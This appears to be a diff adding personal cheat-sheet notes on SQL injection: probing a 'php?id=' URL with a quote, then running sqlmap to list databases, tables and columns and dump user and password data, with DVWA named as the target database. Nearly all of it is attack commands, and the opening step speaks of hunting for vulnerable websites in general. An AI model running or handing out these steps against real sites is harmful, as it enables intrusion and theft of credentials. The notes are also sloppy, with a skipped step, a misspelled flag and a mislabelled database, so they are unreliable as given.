@@ -1,0 +1,22 @@
+1) to search the vulnerable website::::
+      in website::: php?id=1
+       
+      # in url at end put ' and error will be shown
+ 
+ 
+2) copy url from website:::
+     :::in terminal:::
+            sqlmap -u "URL" --dbs   
+
+4) to fetch all tables from a particular database::::
+       :::in terminal:::
+              same command -D dvwa --tables                  //mysql is database name
+
+5) to fetch all coloumns from a particular table::::
+      :::in terminal:::
+              same command -T users --coloumn                //enter threads less no. is slow but safe       //users is table name
+
+6) to look and see data in various coloumns of tables::::
+      :::in terminal:::
+               same command -C user,password --dump              //use default dictionory type y,1,enter(press)    //user and password are coloumn names
+
